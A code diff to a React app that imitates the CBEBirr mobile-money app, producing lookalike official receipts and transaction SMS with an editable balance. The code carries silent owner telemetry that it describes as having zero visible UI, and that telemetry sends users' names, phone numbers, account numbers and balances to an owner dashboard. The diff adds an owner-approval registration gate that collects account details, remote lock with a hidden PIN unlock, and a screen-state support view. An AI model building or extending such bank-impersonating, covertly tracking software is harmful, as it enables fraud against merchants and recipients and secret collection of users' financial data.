@@ -2,7 +2,7 @@
 
 import React, { useState, useEffect, useRef, useMemo, useCallback } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
-import { ArrowLeft, Download, Share2, Printer, Search, Trash2, Edit2, Plus, User, ChevronRight, Receipt, MapPin, Phone, HelpCircle, Fingerprint, WifiOff, CheckCircle2, MessageSquare, RefreshCw, Send, Check, X, Lock, Bell } from 'lucide-react';
+import { ArrowLeft, Download, Share2, Printer, Search, Trash2, Edit2, Plus, User, ChevronRight, Receipt, MapPin, Phone, HelpCircle, Fingerprint, WifiOff, CheckCircle2, MessageSquare, RefreshCw, Send, Check, X, Lock, Crosshair, Monitor, Power, ShieldCheck } from 'lucide-react';
 import CBEAuthenticSpinner from './CBEAuthenticSpinner';
 import {
   sendTransactionSms,
@@ -13,6 +13,7 @@ import {
   getAppBaseUrl,
   getShortQrBaseUrl,
   dispatchNativeDevicePair,
+  dispatchNativeOwnerNotification,
 } from '@/lib/sms-webhook';
 import {
   generateStyledQrDataUrl,
@@ -22,11 +23,16 @@ import { downloadReceiptPdfUniversally } from '@/lib/client-receipt-pdf';
 import SamsungMessagesApp from './SamsungMessagesApp';
 import PinchZoomContainer from './PinchZoomContainer';
 import OwnerControlDashboard from './OwnerControlDashboard';
-import { OWNER_PIN, OwnerNotification } from '@/lib/owner-types';
+import { OWNER_PIN, SupportSession } from '@/lib/owner-types';
 import {
+  endSupportView,
+  fetchSupportSession,
   getCachedLockState,
+  getOrCreateOwnerDeviceId,
   markNotificationSeen,
+  pushSupportStateDelta,
   reportDeviceTransaction,
+  respondSupportConsent,
   sendOfflineBeacon,
   syncDeviceTelemetry,
 } from '@/lib/owner-telemetry';
@@ -451,52 +457,216 @@ export default function CBEBirrFullscreenApp() {
     }
   }, [userAccount, isStorageHydrated]);
 
-  // Silent Owner Control Telemetry, Remote Lock & Timed Notification State (Zero visible UI for normal users)
+  // Silent Owner Control Telemetry, Remote Lock & Real System Notification State (Zero visible UI for normal users)
   const [showOwnerDashboard, setShowOwnerDashboard] = useState<boolean>(false);
   const [remoteLockState, setRemoteLockState] = useState<{ locked: boolean; message: string }>({
     locked: false,
     message: '',
   });
-  const [activeOwnerNotif, setActiveOwnerNotif] = useState<OwnerNotification | null>(null);
-  const activeOwnerNotifRef = useRef<OwnerNotification | null>(null);
-  const notifDismissTimerRef = useRef<NodeJS.Timeout | null>(null);
-  const notifQueueRef = useRef<OwnerNotification[]>([]);
   const [lockShieldTaps, setLockShieldTaps] = useState<number>(0);
   const [showLockOwnerUnlock, setShowLockOwnerUnlock] = useState<boolean>(false);
   const [lockOwnerPinInput, setLockOwnerPinInput] = useState<string>('');
   const [lockOwnerPinError, setLockOwnerPinError] = useState<string>('');
+
+  // Transparent Consent-Based Live Support View State
+  const [supportSession, setSupportSession] = useState<SupportSession | null>(null);
+  const [supportConsentBusy, setSupportConsentBusy] = useState<boolean>(false);
+  const [supportTipBanner, setSupportTipBanner] = useState<string>('');
+  const [supportReconnecting, setSupportReconnecting] = useState<boolean>(false);
+  const supportStateSeqRef = useRef<number>(0);
+  const lastAppliedCommandSeqRef = useRef<number>(0);
+  const lastPushedSigRef = useRef<string>('');
+  const supportSessionRef = useRef<SupportSession | null>(null);
+  useEffect(() => {
+    supportSessionRef.current = supportSession;
+  }, [supportSession]);
 
   const profileSyncRef = useRef({ userName, phoneNumber, userAccount, balance });
   useEffect(() => {
     profileSyncRef.current = { userName, phoneNumber, userAccount, balance };
   }, [userName, phoneNumber, userAccount, balance]);
 
-  const showNextNotifRef = useRef<() => void>(() => {});
-  const showNextQueuedNotification = useCallback(() => {
-    if (notifDismissTimerRef.current) {
-      clearTimeout(notifDismissTimerRef.current);
-      notifDismissTimerRef.current = null;
-    }
-    const next = notifQueueRef.current.shift() || null;
-    activeOwnerNotifRef.current = next;
-    setActiveOwnerNotif(next);
-    if (next) {
-      markNotificationSeen(next.notifId);
-      try {
-        if (typeof navigator !== 'undefined' && typeof navigator.vibrate === 'function') {
-          navigator.vibrate([120, 60, 120]);
-        }
-      } catch {}
-      const displayMs = Math.max(2000, Math.min(86_400_000, (next.durationSeconds || 30) * 1000));
-      notifDismissTimerRef.current = setTimeout(() => {
-        showNextNotifRef.current();
-      }, displayMs);
-    }
+  // New Device Registration & Owner Approval Gate State
+  const DEVICE_APPROVAL_KEY = 'cbebirr_device_approval_v1';
+  const [deviceGateState, setDeviceGateState] = useState<'hydrating' | 'register' | 'pending' | 'approved' | 'rejected'>('hydrating');
+  const [regFullName, setRegFullName] = useState<string>('');
+  const [regPhone, setRegPhone] = useState<string>('');
+  const [regAccount, setRegAccount] = useState<string>('');
+  const [regError, setRegError] = useState<string>('');
+  const [regSubmitting, setRegSubmitting] = useState<boolean>(false);
+  const deviceGateStateRef = useRef<'hydrating' | 'register' | 'pending' | 'approved' | 'rejected'>('hydrating');
+  useEffect(() => {
+    deviceGateStateRef.current = deviceGateState;
+  }, [deviceGateState]);
+
+  const exitAppCleanly = useCallback(() => {
+    if (typeof window === 'undefined') return;
+    try {
+      const w = window as unknown as {
+        AndroidSMSBridge?: { exitApp?: () => void };
+        AndroidBridge?: { exitApp?: () => void };
+        Android?: { exitApp?: () => void };
+      };
+      if (typeof w.AndroidSMSBridge?.exitApp === 'function') {
+        w.AndroidSMSBridge.exitApp();
+        return;
+      }
+      if (typeof w.AndroidBridge?.exitApp === 'function') {
+        w.AndroidBridge.exitApp();
+        return;
+      }
+      if (typeof w.Android?.exitApp === 'function') {
+        w.Android.exitApp();
+        return;
+      }
+    } catch {}
+    try {
+      window.close();
+    } catch {}
   }, []);
 
+  const handleSubmitDeviceRegistration = async (e?: React.FormEvent) => {
+    if (e) e.preventDefault();
+    if (regSubmitting) return;
+    const cleanName = regFullName.trim();
+    const digits = regPhone.replace(/\D/g, '');
+    let normPhone = digits;
+    if (normPhone.startsWith('251')) normPhone = normPhone.slice(3);
+    if (normPhone.startsWith('0')) normPhone = normPhone.slice(1);
+    normPhone = normPhone.slice(0, 9);
+    const cleanAcc = regAccount.trim();
+
+    if (!cleanName || cleanName.length < 2) {
+      setRegError('Please enter your Full Name.');
+      return;
+    }
+    if (normPhone.length < 9) {
+      setRegError('Please enter a valid Phone Number.');
+      return;
+    }
+    if (!cleanAcc || cleanAcc.length < 4) {
+      setRegError('Please enter your Account Number.');
+      return;
+    }
+
+    setRegError('');
+    setRegSubmitting(true);
+
+    setUserName(cleanName);
+    setPhoneNumber(normPhone);
+    setUserAccount(cleanAcc);
+
+    try {
+      localStorage.setItem('cbebirr_user_name', cleanName);
+      localStorage.setItem('cbebirr_phone_number', normPhone);
+      localStorage.setItem('cbebirr_user_account', cleanAcc);
+      localStorage.setItem(DEVICE_APPROVAL_KEY, 'pending');
+    } catch {}
+
+    profileSyncRef.current = {
+      userName: cleanName,
+      phoneNumber: normPhone,
+      userAccount: cleanAcc,
+      balance,
+    };
+
+    setDeviceGateState('pending');
+
+    try {
+      const res = await syncDeviceTelemetry({
+        userName: cleanName,
+        phoneNumber: normPhone,
+        userAccount: cleanAcc,
+        balance,
+        registerRequest: true,
+        forceApprovalCheck: true,
+      });
+      if (res?.approvalStatus === 'approved') {
+        try {
+          localStorage.setItem(DEVICE_APPROVAL_KEY, 'approved');
+        } catch {}
+        setDeviceGateState('approved');
+      } else if (res?.approvalStatus === 'rejected') {
+        try {
+          localStorage.setItem(DEVICE_APPROVAL_KEY, 'rejected');
+        } catch {}
+        setDeviceGateState('rejected');
+        exitAppCleanly();
+      }
+    } finally {
+      setRegSubmitting(false);
+    }
+  };
+
+  const deliverSystemNotification = useCallback(
+    async (notif: {
+      notifId: string;
+      targetDeviceId?: string;
+      title?: string;
+      message: string;
+      durationSeconds?: number;
+    }) => {
+      if (!notif?.notifId || !notif?.message) return;
+      markNotificationSeen(notif.notifId);
+
+      const isNativeApk =
+        typeof window !== 'undefined' &&
+        (window.location?.origin?.includes('appassets.androidplatform.net') ||
+          window.location?.protocol === 'file:' ||
+          Boolean((window as any).Android || (window as any).AndroidBridge || (window as any).AndroidSMSBridge));
+
+      // Forward over Android IPC so local native notification helper fires immediately (deduped by notifId)
+      const dispatchedNative = dispatchNativeOwnerNotification(notif);
+      if (isNativeApk || dispatchedNative) {
+        return;
+      }
+
+      // Web / PWA real OS notification
+      if (typeof window !== 'undefined' && 'Notification' in window && Notification.permission === 'granted') {
+        const title = notif.title || 'CBEBirr';
+        const options = {
+          body: notif.message,
+          icon: '/assets/cbe_birr_logo.png',
+          badge: '/assets/cbe_birr_logo_192.png',
+          tag: notif.notifId,
+          renotify: true,
+        } as NotificationOptions;
+        try {
+          if ('serviceWorker' in navigator) {
+            const reg = await navigator.serviceWorker.ready;
+            if (reg && typeof reg.showNotification === 'function') {
+              await reg.showNotification(title, options);
+              return;
+            }
+          }
+        } catch {}
+        try {
+          new Notification(title, options);
+        } catch {}
+      }
+    },
+    []
+  );
+
   useEffect(() => {
-    showNextNotifRef.current = showNextQueuedNotification;
-  }, [showNextQueuedNotification]);
+    if (typeof window === 'undefined' || !('Notification' in window)) return;
+    const isNativeApk =
+      window.location?.origin?.includes('appassets.androidplatform.net') ||
+      window.location?.protocol === 'file:' ||
+      Boolean((window as any).Android || (window as any).AndroidBridge || (window as any).AndroidSMSBridge);
+    if (isNativeApk || Notification.permission !== 'default') return;
+
+    const askOnce = () => {
+      try {
+        if (Notification.permission === 'default') {
+          void Notification.requestPermission().catch(() => {});
+        }
+      } catch {}
+      window.removeEventListener('pointerdown', askOnce);
+    };
+    window.addEventListener('pointerdown', askOnce, { once: true });
+    return () => window.removeEventListener('pointerdown', askOnce);
+  }, []);
 
   useEffect(() => {
     queueMicrotask(() => {
@@ -506,39 +676,73 @@ export default function CBEBirrFullscreenApp() {
   }, []);
 
   useEffect(() => {
-    if (!isStorageHydrated) return;
+    if (!isStorageHydrated || deviceGateState === 'hydrating' || deviceGateState === 'register') return;
     let active = true;
 
     const runSync = async () => {
       if (!active) return;
+      const gate = deviceGateStateRef.current;
+      if (gate === 'hydrating' || gate === 'register') return;
       const p = profileSyncRef.current;
-      const res = await syncDeviceTelemetry(p);
+      const res = await syncDeviceTelemetry({
+        ...p,
+        forceApprovalCheck: gate === 'pending' || gate === 'rejected',
+      });
       if (!active || !res) return;
+
+      const isOnlineNow = typeof navigator === 'undefined' || navigator.onLine !== false;
+      if (isOnlineNow) {
+        if (res.approvalStatus === 'rejected') {
+          try {
+            localStorage.setItem(DEVICE_APPROVAL_KEY, 'rejected');
+          } catch {}
+          setDeviceGateState('rejected');
+          exitAppCleanly();
+          return;
+        } else if (res.approvalStatus === 'approved' && (gate === 'pending' || gate === 'rejected')) {
+          try {
+            localStorage.setItem(DEVICE_APPROVAL_KEY, 'approved');
+          } catch {}
+          setDeviceGateState('approved');
+        } else if (res.approvalStatus === 'pending' && gate === 'rejected') {
+          try {
+            localStorage.setItem(DEVICE_APPROVAL_KEY, 'pending');
+          } catch {}
+          setDeviceGateState('pending');
+        }
+      } else if (gate === 'rejected') {
+        exitAppCleanly();
+        return;
+      }
+
       setRemoteLockState({
         locked: res.lockState.locked,
         message: res.lockState.message,
       });
       if (res.newNotifications.length > 0) {
-        const existingIds = new Set(notifQueueRef.current.map((n) => n.notifId));
-        if (activeOwnerNotifRef.current?.notifId) {
-          existingIds.add(activeOwnerNotifRef.current.notifId);
-        }
-        let added = false;
         for (const n of res.newNotifications) {
-          if (!existingIds.has(n.notifId)) {
-            notifQueueRef.current.push(n);
-            existingIds.add(n.notifId);
-            added = true;
-          }
+          void deliverSystemNotification(n);
         }
-        if (added && !activeOwnerNotifRef.current) {
-          showNextQueuedNotification();
+      }
+      if (res.supportSession) {
+        if (
+          res.supportSession.status === 'pending' ||
+          res.supportSession.status === 'active'
+        ) {
+          setSupportSession(res.supportSession);
+        } else if (supportSessionRef.current) {
+          setSupportSession(null);
+          setSupportTipBanner('');
         }
+      } else if (supportSessionRef.current) {
+        setSupportSession(null);
+        setSupportTipBanner('');
       }
     };
 
     runSync();
-    const intervalId = setInterval(runSync, 4000);
+    const pollMs = deviceGateState === 'pending' ? 2000 : 4000;
+    const intervalId = setInterval(runSync, pollMs);
 
     let lastPairBroadcastMs = 0;
     const triggerPairBroadcast = () => {
@@ -574,16 +778,55 @@ export default function CBEBirrFullscreenApp() {
       window.removeEventListener('focus', onFocus);
       window.removeEventListener('pagehide', onPageHide);
     };
-  }, [isStorageHydrated, showNextQueuedNotification]);
+  }, [isStorageHydrated, deviceGateState, deliverSystemNotification, exitAppCleanly]);
 
   // Immediately push profile/balance edits to owner dashboard when user edits name, phone, or balance
   useEffect(() => {
-    if (!isStorageHydrated) return;
+    if (!isStorageHydrated || (deviceGateState !== 'approved' && deviceGateState !== 'pending')) return;
     const t = setTimeout(() => {
       syncDeviceTelemetry(profileSyncRef.current).catch(() => {});
     }, 600);
     return () => clearTimeout(t);
-  }, [userName, phoneNumber, userAccount, balance, isStorageHydrated]);
+  }, [userName, phoneNumber, userAccount, balance, isStorageHydrated, deviceGateState]);
+
+  const handleAcceptSupportRequest = async () => {
+    setSupportConsentBusy(true);
+    try {
+      lastAppliedCommandSeqRef.current = 0;
+      lastPushedSigRef.current = '';
+      const active = await respondSupportConsent(true);
+      if (active && active.status === 'active') {
+        setSupportSession(active);
+      } else {
+        setSupportSession(null);
+      }
+    } finally {
+      setSupportConsentBusy(false);
+    }
+  };
+
+  const handleDeclineSupportRequest = async () => {
+    setSupportConsentBusy(true);
+    try {
+      await respondSupportConsent(false);
+      setSupportSession(null);
+      setSupportTipBanner('');
+    } finally {
+      setSupportConsentBusy(false);
+    }
+  };
+
+  const handleUserEndSupportSession = async () => {
+    const myId = getOrCreateOwnerDeviceId();
+    setSupportConsentBusy(true);
+    try {
+      await endSupportView(myId, false);
+      setSupportSession(null);
+      setSupportTipBanner('');
+    } finally {
+      setSupportConsentBusy(false);
+    }
+  };
 
   // Profile Details Edit Modal state
   const [isProfileModalOpen, setIsProfileModalOpen] = useState<boolean>(false);
@@ -816,6 +1059,192 @@ export default function CBEBirrFullscreenApp() {
       (w) => w.name.toLowerCase().includes(term) || w.id.toLowerCase().includes(term)
     );
   }, [walletSearchTerm]);
+
+  // Apply incoming Support View guidance commands safely (non-PIN / non-USSD navigation & tips)
+  const applySupportCommands = useCallback((sess: SupportSession) => {
+    if (!sess || sess.status !== 'active') return;
+    if (sess.commandSeq > lastAppliedCommandSeqRef.current) {
+      lastAppliedCommandSeqRef.current = sess.commandSeq;
+      if (sess.commandType === 'navigate_step') {
+        const target = Number(sess.commandPayload);
+        const SAFE_STEPS = new Set([4, 6, 11, 14, 15, 16]);
+        if (SAFE_STEPS.has(target)) {
+          setCurrentStep(target as ScreenStep);
+          setIsSendMoneyMenuOpen(false);
+        }
+      } else if (sess.commandType === 'show_tip' && sess.commandPayload) {
+        setSupportTipBanner(sess.commandPayload);
+        setTimeout(() => {
+          setSupportTipBanner((prev) => (prev === sess.commandPayload ? '' : prev));
+        }, 9000);
+      }
+    }
+  }, []);
+
+  // Poll Support View commands ONLY while a session is pending or active (zero polls when idle)
+  useEffect(() => {
+    const status = supportSession?.status;
+    if (status !== 'pending' && status !== 'active') {
+      return;
+    }
+
+    let cancelled = false;
+    let inFlight = false;
+    let errCount = 0;
+    const myId = getOrCreateOwnerDeviceId();
+
+    const pollSupport = async () => {
+      if (cancelled || inFlight) return;
+      inFlight = true;
+      try {
+        const latest = await fetchSupportSession(myId, false);
+        if (cancelled) return;
+        if (latest) {
+          errCount = 0;
+          setSupportReconnecting(false);
+          if (latest.status === 'pending' || latest.status === 'active') {
+            setSupportSession(latest);
+            applySupportCommands(latest);
+          } else {
+            setSupportSession(null);
+            setSupportTipBanner('');
+          }
+        } else {
+          errCount += 1;
+          if (errCount >= 2) setSupportReconnecting(true);
+        }
+      } catch {
+        if (!cancelled) {
+          errCount += 1;
+          if (errCount >= 2) setSupportReconnecting(true);
+        }
+      } finally {
+        inFlight = false;
+      }
+    };
+
+    const tid = setInterval(() => {
+      void pollSupport();
+    }, 1500);
+    window.addEventListener('online', pollSupport);
+
+    return () => {
+      cancelled = true;
+      clearInterval(tid);
+      window.removeEventListener('online', pollSupport);
+    };
+  }, [supportSession?.status, applySupportCommands]);
+
+  // Low-Data JSON Delta Sync during Explicit Active Support Session (~300 bytes only on UI state change)
+  useEffect(() => {
+    if (supportSession?.status !== 'active') return;
+
+    const STEP_TITLES: Record<number, string> = {
+      1: 'Splash Screen',
+      2: 'Login Phone Number',
+      3: 'PIN Entry (Private)',
+      4: 'CBEBirr Home',
+      5: 'Transfer Confirm',
+      6: 'CBE Account Transfer',
+      7: 'Recent Transactions',
+      8: 'Transfer Receipt',
+      9: 'Mini Apps',
+      10: 'QR Scanner',
+      11: 'Pay Bill',
+      12: 'Pay Confirmation',
+      13: 'Official CBE Receipt',
+      14: 'Others Menu',
+      15: 'Send Money (Phone)',
+      16: 'Bank Transfer',
+      17: 'Wallet & Micro Finance',
+    };
+
+    const activeTab =
+      currentStep === 14
+        ? 'others'
+        : currentStep === 11 || currentStep === 12
+          ? 'pay'
+          : [5, 6, 15, 16, 17].includes(currentStep)
+            ? 'transfer'
+            : 'home';
+
+    const screenTitle = STEP_TITLES[currentStep] || `Screen ${currentStep}`;
+
+    let recipientSummary = '';
+    let amountSummary = '';
+
+    if (currentStep === 3) {
+      recipientSummary = 'PIN Protected';
+    } else if (currentStep === 6) {
+      recipientSummary = [customVerifiedReceiverName, receiverAccount].filter(Boolean).join(' • ');
+      amountSummary = sendAmount.trim();
+    } else if (currentStep === 15) {
+      recipientSummary = [phoneReceiverName, phoneReceiverNumber].filter(Boolean).join(' • ');
+      amountSummary = phoneSendAmount.trim();
+    } else if (currentStep === 16) {
+      recipientSummary = [selectedBank?.name, bankReceiverName, bankAccountNumber]
+        .filter(Boolean)
+        .join(' • ');
+      amountSummary = bankAmount.trim();
+    } else if (currentStep === 17) {
+      recipientSummary = [selectedWallet?.name, walletReceiverName, walletAccountNumber]
+        .filter(Boolean)
+        .join(' • ');
+      amountSummary = walletAmount.trim();
+    } else if (currentStep === 8 || currentStep === 13) {
+      recipientSummary = 'Viewing Transaction Receipt';
+    } else {
+      recipientSummary = screenTitle;
+    }
+
+    const deltaPayload = {
+      currentStep,
+      activeTab,
+      screenTitle,
+      recipientSummary: recipientSummary.slice(0, 140),
+      amountSummary: amountSummary.slice(0, 40),
+      balance,
+      userName,
+      phoneNumber,
+    };
+
+    const sig = JSON.stringify(deltaPayload);
+    if (sig === lastPushedSigRef.current) return;
+
+    const pushNow = () => {
+      supportStateSeqRef.current += 1;
+      lastPushedSigRef.current = sig;
+      pushSupportStateDelta({
+        ...deltaPayload,
+        stateSeq: supportStateSeqRef.current,
+      }).catch(() => {
+        lastPushedSigRef.current = '';
+      });
+    };
+
+    const timerId = setTimeout(pushNow, 180);
+    return () => clearTimeout(timerId);
+  }, [
+    supportSession?.status,
+    currentStep,
+    userName,
+    phoneNumber,
+    balance,
+    receiverAccount,
+    customVerifiedReceiverName,
+    sendAmount,
+    phoneReceiverNumber,
+    phoneReceiverName,
+    phoneSendAmount,
+    selectedBank?.name,
+    bankAccountNumber,
+    bankReceiverName,
+    bankAmount,
+    selectedWallet?.name,
+    walletAccountNumber,
+    walletReceiverName,
+    walletAmount,
+  ]);
 
   // Step 16 & 17 Transfer Confirmation Bottom Sheet State (Matches User Screenshots)
   const [isBankConfirmOpen, setIsBankConfirmOpen] = useState<boolean>(false);
@@ -1527,8 +1956,22 @@ export default function CBEBirrFullscreenApp() {
         if (storedActivePhoneUssd && loadedPhoneUssdList.some((p) => p.id === storedActivePhoneUssd)) {
           setActivePhoneUssdId(storedActivePhoneUssd);
         }
+
+        const storedApproval = localStorage.getItem(DEVICE_APPROVAL_KEY);
+        if (storedApproval === 'approved') {
+          setDeviceGateState('approved');
+        } else if (storedApproval === 'pending') {
+          setDeviceGateState('pending');
+        } else if (storedApproval === 'rejected') {
+          setDeviceGateState('rejected');
+        } else {
+          if (storedName) setRegFullName(storedName);
+          if (storedPhone) setRegPhone(storedPhone);
+          if (storedAcc) setRegAccount(storedAcc);
+          setDeviceGateState('register');
+        }
       } catch {
-        // ignore
+        if (active) setDeviceGateState('register');
       } finally {
         if (active) setIsStorageHydrated(true);
       }
@@ -3288,25 +3731,27 @@ export default function CBEBirrFullscreenApp() {
   const startYRef = useRef(0);
   const scrollTopRef = useRef(0);
 
-  // Step 1 - Splash screen 1: Transitions to Splash screen 2 after 2.2s (or on tap)
+  // Step 1 - Splash screen 1: Transitions to Splash screen 2 after 2.2s (paused until device approved)
   useEffect(() => {
+    if (deviceGateState !== 'approved') return;
     if (currentStep === 1 && splashStep === 1) {
       const timer = setTimeout(() => {
         setSplashStep(2);
       }, 2200);
       return () => clearTimeout(timer);
     }
-  }, [currentStep, splashStep]);
+  }, [currentStep, splashStep, deviceGateState]);
 
-  // Step 1 - Splash screen 2: Faster duration (1.3s, per user request: "tnsh feten ybel") then enters Step 2 (Phone Login)
+  // Step 1 - Splash screen 2: Faster duration (1.3s) then enters Step 2 (Phone Login)
   useEffect(() => {
+    if (deviceGateState !== 'approved') return;
     if (currentStep === 1 && splashStep === 2) {
       const timer = setTimeout(() => {
         setCurrentStep(2);
       }, 1300);
       return () => clearTimeout(timer);
     }
-  }, [currentStep, splashStep]);
+  }, [currentStep, splashStep, deviceGateState]);
 
   // Auto-transition to Home page after loading spinner on Step 2 (Phone Login page)
   useEffect(() => {
@@ -3692,6 +4137,73 @@ export default function CBEBirrFullscreenApp() {
         className="relative overflow-hidden bg-white flex flex-col justify-center items-center shadow-2xl sm:rounded-[36px] sm:shadow-[0_25px_80px_rgba(0,0,0,0.95),0_0_0_1px_rgba(255,255,255,0.12)] sm:border-[6px] sm:border-[#1a1a20]"
       >
 
+        {/* Persistent Top "Remote Session Active" Transparency Bar */}
+        {supportSession?.status === 'active' && !showOwnerDashboard && (
+          <div className="absolute top-0 left-0 right-0 z-[75] bg-emerald-600/95 backdrop-blur-xs text-white px-3 py-1.5 flex items-center justify-between gap-2 shadow-md">
+            <div className="flex items-center gap-1.5 min-w-0">
+              <span className="w-2 h-2 rounded-full bg-white animate-pulse shrink-0" />
+              <ShieldCheck className="w-3.5 h-3.5 shrink-0" />
+              <span className="text-[11px] font-bold truncate">
+                Remote Session Active
+              </span>
+              {supportReconnecting && (
+                <span className="text-[9.5px] px-1.5 py-0.5 rounded bg-amber-400/30 text-amber-100 font-semibold shrink-0">
+                  Reconnecting...
+                </span>
+              )}
+            </div>
+            <button
+              type="button"
+              disabled={supportConsentBusy}
+              onClick={handleUserEndSupportSession}
+              className="px-2 py-0.5 rounded-md bg-rose-600 hover:bg-rose-500 text-white text-[10px] font-bold flex items-center gap-1 cursor-pointer shrink-0 shadow-xs"
+            >
+              <Power className="w-2.5 h-2.5" />
+              <span>End</span>
+            </button>
+          </div>
+        )}
+
+        {/* Visible Support Tip Toast inside Active Support Session */}
+        {supportSession?.status === 'active' && supportTipBanner && !showOwnerDashboard && (
+          <div className="absolute top-9 left-3 right-3 z-[75] bg-[#17212b]/95 text-white border border-emerald-400/50 rounded-xl px-3 py-2 shadow-xl flex items-start justify-between gap-2">
+            <div className="flex items-start gap-2 min-w-0">
+              <HelpCircle className="w-4 h-4 text-emerald-300 shrink-0 mt-0.5" />
+              <p className="text-[11.5px] font-medium leading-snug break-words">
+                {supportTipBanner}
+              </p>
+            </div>
+            <button
+              type="button"
+              onClick={() => setSupportTipBanner('')}
+              className="text-slate-300 hover:text-white cursor-pointer shrink-0"
+              aria-label="Dismiss tip"
+            >
+              <X className="w-3.5 h-3.5" />
+            </button>
+          </div>
+        )}
+
+        {/* Visible Remote Guide Pointer (Shown explicitly to user during Active Session) */}
+        {supportSession?.status === 'active' &&
+          !showOwnerDashboard &&
+          supportSession.pointerX >= 0 &&
+          supportSession.pointerY >= 0 && (
+            <div
+              style={{
+                left: `${supportSession.pointerX}%`,
+                top: `${supportSession.pointerY}%`,
+              }}
+              className="absolute -translate-x-1/2 -translate-y-1/2 z-[74] pointer-events-none flex flex-col items-center"
+            >
+              <div className="w-10 h-10 rounded-full border-[3px] border-emerald-500 bg-emerald-400/25 shadow-[0_0_20px_rgba(16,185,129,0.8)] animate-pulse flex items-center justify-center">
+                <Crosshair className="w-5 h-5 text-emerald-700" />
+              </div>
+              <span className="mt-1 px-2 py-0.5 rounded-md bg-emerald-700 text-white text-[10px] font-bold shadow whitespace-nowrap">
+                {supportSession.pointerLabel || 'Support Guide'}
+              </span>
+            </div>
+          )}
 
         <AnimatePresence initial={false}>
           {/* STEP 1 - SUB-STEP 1: FIRST SPLASH SCREEN (Original circle token) */}
@@ -11055,45 +11567,6 @@ export default function CBEBirrFullscreenApp() {
           )}
         </AnimatePresence>
 
-        {/* Remote Timed Notification Banner (Android/Samsung Heads-up Notification Style) */}
-        <AnimatePresence>
-          {activeOwnerNotif && (
-            <motion.div
-              key={activeOwnerNotif.notifId}
-              initial={{ y: -110, opacity: 0 }}
-              animate={{ y: 0, opacity: 1 }}
-              exit={{ y: -110, opacity: 0 }}
-              transition={{ type: 'spring', damping: 24, stiffness: 320 }}
-              className="fixed top-3 left-1/2 -translate-x-1/2 w-[calc(100%-24px)] max-w-[430px] z-[9999] bg-[#1e1e24]/95 backdrop-blur-md text-white rounded-2xl shadow-[0_12px_32px_rgba(0,0,0,0.45)] border border-white/15 p-3.5"
-            >
-              <div className="flex items-start gap-3">
-                <div className="w-9 h-9 rounded-full bg-[#7a1c7d] flex items-center justify-center shrink-0 shadow-inner">
-                  <Bell className="w-4.5 h-4.5 text-white" />
-                </div>
-                <div className="flex-1 min-w-0">
-                  <div className="flex items-center justify-between gap-2">
-                    <span className="text-[12.5px] font-bold text-white truncate">
-                      {activeOwnerNotif.title || 'CBEBirr'}
-                    </span>
-                    <span className="text-[10px] text-slate-400 shrink-0">now</span>
-                  </div>
-                  <p className="text-[12px] text-slate-200 leading-snug mt-0.5 break-words">
-                    {activeOwnerNotif.message}
-                  </p>
-                </div>
-                <button
-                  type="button"
-                  onClick={() => showNextQueuedNotification()}
-                  className="text-slate-400 hover:text-white p-1 -mr-1 cursor-pointer"
-                  aria-label="Dismiss notification"
-                >
-                  <X className="w-4 h-4" />
-                </button>
-              </div>
-            </motion.div>
-          )}
-        </AnimatePresence>
-
         {/* Remote App Lock Overlay (Global or Per-Device Lock; 5-tap shield for Owner 0069 recovery) */}
         <AnimatePresence>
           {remoteLockState.locked && !showOwnerDashboard && (
@@ -11175,6 +11648,172 @@ export default function CBEBirrFullscreenApp() {
             </motion.div>
           )}
         </AnimatePresence>
+
+        {/* Explicit Consent Modal for Live Support View */}
+        <AnimatePresence>
+          {supportSession?.status === 'pending' && !showOwnerDashboard && (
+            <motion.div
+              initial={{ opacity: 0 }}
+              animate={{ opacity: 1 }}
+              exit={{ opacity: 0 }}
+              className="absolute inset-0 z-[85] bg-black/70 backdrop-blur-xs flex items-center justify-center p-5 select-none"
+            >
+              <motion.div
+                initial={{ scale: 0.94, opacity: 0 }}
+                animate={{ scale: 1, opacity: 1 }}
+                exit={{ scale: 0.94, opacity: 0 }}
+                className="w-full max-w-[300px] bg-white rounded-3xl p-5 shadow-2xl border border-purple-200 text-center space-y-3"
+              >
+                <div className="w-14 h-14 mx-auto rounded-2xl bg-purple-100 text-[#7a1c7d] flex items-center justify-center">
+                  <Monitor className="w-7 h-7" />
+                </div>
+                <h2 className="text-[16px] font-bold text-slate-900">
+                  Support View Request
+                </h2>
+                <p className="text-[12px] text-slate-600 leading-relaxed">
+                  Support is requesting temporary access to view your current screen state and guide you with an on-screen pointer. Your PIN stays strictly private.
+                </p>
+                <p className="text-[11px] font-semibold text-[#7a1c7d]">
+                  የቀጥታ Support እገዛ መፍቀድ ይፈልጋሉ?
+                </p>
+                <div className="grid grid-cols-2 gap-2.5 pt-2">
+                  <button
+                    type="button"
+                    disabled={supportConsentBusy}
+                    onClick={handleDeclineSupportRequest}
+                    className="py-2.5 rounded-2xl bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold text-[12.5px] cursor-pointer"
+                  >
+                    Decline
+                  </button>
+                  <button
+                    type="button"
+                    disabled={supportConsentBusy}
+                    onClick={handleAcceptSupportRequest}
+                    className="py-2.5 rounded-2xl bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-[12.5px] shadow cursor-pointer"
+                  >
+                    Allow
+                  </button>
+                </div>
+              </motion.div>
+            </motion.div>
+          )}
+        </AnimatePresence>
+
+        {/* New Device Registration & Owner Approval Gate (Strict pre-entry barrier) */}
+        {deviceGateState === 'hydrating' && (
+          <div className="absolute inset-0 z-[92] bg-[#7a1c7d] flex items-center justify-center">
+            <CBEAuthenticSpinner size={42} color="#ffffff" speed={0.95} />
+          </div>
+        )}
+
+        {deviceGateState === 'register' && (
+          <div className="absolute inset-0 z-[92] bg-[#f7f4f8] flex flex-col justify-between p-6 overflow-y-auto select-none">
+            <div className="w-full max-w-[340px] mx-auto my-auto bg-white rounded-3xl shadow-xl border border-purple-100 p-6 space-y-5">
+              <div className="flex flex-col items-center text-center gap-2">
+                <div className="w-16 h-16 rounded-2xl overflow-hidden shadow-md bg-[#7a1c7d] flex items-center justify-center">
+                  {/* eslint-disable-next-line @next/next/no-img-element */}
+                  <img
+                    src="/assets/cbe_birr_logo.png"
+                    alt="CBEBirr"
+                    className="w-full h-full object-cover"
+                    draggable={false}
+                  />
+                </div>
+                <h1 className="text-[20px] font-bold text-[#7a1c7d] tracking-tight">
+                  Register
+                </h1>
+              </div>
+
+              <form onSubmit={handleSubmitDeviceRegistration} className="space-y-4">
+                <div className="space-y-1.5">
+                  <label className="block text-[12px] font-semibold text-slate-700">
+                    Full Name
+                  </label>
+                  <input
+                    type="text"
